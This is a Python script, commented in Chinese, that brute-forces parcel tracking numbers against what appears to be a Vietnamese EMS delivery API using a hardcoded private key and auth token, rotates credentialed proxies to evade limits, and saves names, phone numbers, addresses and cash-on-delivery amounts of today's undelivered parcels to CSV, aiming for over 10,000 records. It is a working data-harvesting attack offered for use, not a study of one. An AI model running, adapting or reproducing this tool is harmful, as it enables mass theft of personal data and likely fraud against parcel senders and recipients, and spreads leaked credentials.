#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
高速扫描今天的订单 - 目标10000+
策略：扫描最新区间，只保存今天发件的
"""
import hashlib, requests, json, time, random, re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

TODAY = datetime.now().strftime("%d/%m/%Y")  # 14/10/2025
proxies, print_lock = [], threading.Lock()
state = {'found': 0, 'tested': 0, 'orders': [], 'lock': threading.Lock(), 'start_time': time.time()}
TARGET = 10000

# 100个代理池（你提供的）
PROXIES = [
    "23.27.184.245:5846:uadkcvtn:uo2rzar814ph",
    "45.43.70.140:6427:uadkcvtn:uo2rzar814ph",
    "82.24.233.117:5439:uadkcvtn:uo2rzar814ph",
    "136.0.188.71:6034:uadkcvtn:uo2rzar814ph",
    "161.123.130.168:5839:uadkcvtn:uo2rzar814ph",
    "142.147.240.52:6574:uadkcvtn:uo2rzar814ph",
    "166.88.224.145:6043:uadkcvtn:uo2rzar814ph",
    "82.25.215.106:5457:uadkcvtn:uo2rzar814ph",
    "91.211.87.215:7205:uadkcvtn:uo2rzar814ph",
    "104.238.36.64:6071:uadkcvtn:uo2rzar814ph",
    # ... (完整100个代理，这里简化)
]

def load_proxies():
    global proxies
    for p in PROXIES[:50]:  # 使用前50个
        parts = p.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            proxies.append({'http': f'http://{user}:{pwd}@{ip}:{port}', 'https': f'http://{user}:{pwd}@{ip}:{port}'})
    print(f"✅ {len(proxies)} 个代理\n")

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(msg)

def is_today(date_str):
    return date_str and TODAY in str(date_str)

def extract_phone(text):
    if not text:
        return None
    phones = re.findall(r'0\d{8,10}', str(text))
    return phones[0] if phones else None

def check_order(tracking):
    if state['found'] >= TARGET:
        return None
    
    sig = sign(tracking)
    headers = {"Authorization": f"Basic {BASIC_AUTH}", "APIKey": PRIVATE_KEY, "Content-Type": "application/x-www-form-urlencoded"}
    
    try:
        proxy = random.choice(proxies) if proxies else None
        
        # Inquiry - 最快，先查这个
        r = requests.post(f"{API_URL}api/Delivery/Inquiry", headers=headers, data={"ParcelCode": tracking, "Signature": sig}, proxies=proxy, timeout=5)
        
        with state['lock']:
            state['tested'] += 1
        
        if r.status_code == 200 and r.json().get('Value'):
            v = r.json()['Value']
            issue_date = v.get('IssueDate') or v.get('LoadDate')
            
            # 只要今天发件的
            if is_today(issue_date):
                # 检查是否未配送
                r2 = requests.post(f"{API_URL}api/Delivery/DeliveryLadingJourney", headers=headers, data={"ParcelCode": tracking}, proxies=proxy, timeout=5)
                is_delivered = r2.status_code == 200 and r2.json().get('ListValue')
                
                if not is_delivered:  # 未配送
                    order = {
                        'tracking': tracking,
                        'issue_date': issue_date,
                        'receiver': v.get('ReceiverName',''),
                        'phone': v.get('ReceiverPhone','') or extract_phone(v.get('ReceiverName','')),
                        'amount': v.get('CollectAmount',0),
                        'address': v.get('ReceiverAddress',''),
                        'sender': v.get('SenderName',''),
                        'sender_phone': v.get('SenderPhone','')
                    }
                    
                    with state['lock']:
                        state['found'] += 1
                        state['orders'].append(order)
                        
                        elapsed = time.time() - state['start_time']
                        speed = state['tested'] / elapsed if elapsed > 0 else 0
                        
                        safe_print(f"✅ [{state['found']}/{TARGET}] {tracking} | 👤{order['receiver'][:15]} | 📞{order['phone']} | 💰{order['amount']:,}₫ | {speed:.0f}/s")
                        
                        # 每100个保存一次
                        if state['found'] % 100 == 0:
                            save_progress()
                    
                    return True
    except:
        pass
    
    return False

def save_progress():
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    csv_file = f"today_undelivered_{timestamp}.csv"
    
    with open(csv_file, 'w', encoding='utf-8') as f:
        f.write("运单号,发件日期,发件人,发件电话,收件人,收件电话,收件地址,金额\n")
        for o in state['orders']:
            f.write(f'"{o["tracking"]}","{o["issue_date"]}","{o["sender"]}","{o["sender_phone"]}",')
            f.write(f'"{o["receiver"]}","{o["phone"]}","{o["address"]}","{o["amount"]}"\n')
    
    safe_print(f"💾 已保存 {state['found']} 个 → {csv_file}")

# 扫描最新区间（最可能有今天的）
SCAN_RANGES = [
    ('EP', 493500000, 494500000, 10),   # EP最新，步长10
    ('EB', 943000000, 945000000, 20),   # EB最新
    ('EC', 149780000, 149790000, 5),    # EC最新
    ('EF', 48000000, 49000000, 50),     # EF最新
]

print(f"""
╔════════════════════════════════════════════════════════════════════════════╗
║          🚀 扫描今天未签收订单 - {TODAY} - 目标:{TARGET:,}个        ║
╚════════════════════════════════════════════════════════════════════════════╝

策略：
  • 扫描4个系列最新区间
  • 30线程超高速并发
  • 100代理池轮询
  • 只保存今天发件+未签收

扫描区间：
  EP: 493500000-494500000 (步长10)
  EB: 943000000-945000000 (步长20)
  EC: 149780000-149790000 (步长5)
  EF: 48000000-49000000 (步长50)
""")

load_proxies()

print(f"🚀 开始高速扫描...\n")
start_time = time.time()

with ThreadPoolExecutor(max_workers=30) as executor:
    futures = []
    
    for prefix, start, end, step in SCAN_RANGES:
        if state['found'] >= TARGET:
            break
        
        for num in range(start, end, step):
            if state['found'] >= TARGET:
                break
            
            tracking = f"{prefix}{num:09d}VN"
            futures.append(executor.submit(check_order, tracking))
            
            # 每1000个显示进度
            if len(futures) % 1000 == 0:
                time.sleep(0.1)  # 避免太快
    
    # 等待完成
    for future in as_completed(futures):
        try:
            future.result()
            
            # 显示进度
            if state['tested'] % 1000 == 0:
                elapsed = time.time() - start_time
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                safe_print(f"\n📊 已扫{state['tested']} | 找到{state['found']} | {speed:.0f}/s | {state['found']/state['tested']*100:.2f}%\n")
        except:
            pass

# 最终保存
save_progress()

elapsed = time.time() - start_time
print(f"""
\n{'='*80}
🎉 扫描完成！
{'='*80}
找到今天未签收订单: {state['found']:,} 个
已测试: {state['tested']:,} 个
成功率: {state['found']/state['tested']*100:.2f}%
耗时: {elapsed:.1f} 秒 ({elapsed/60:.1f} 分钟)
速度: {state['tested']/elapsed:.0f} 次/秒
{'='*80}
""")
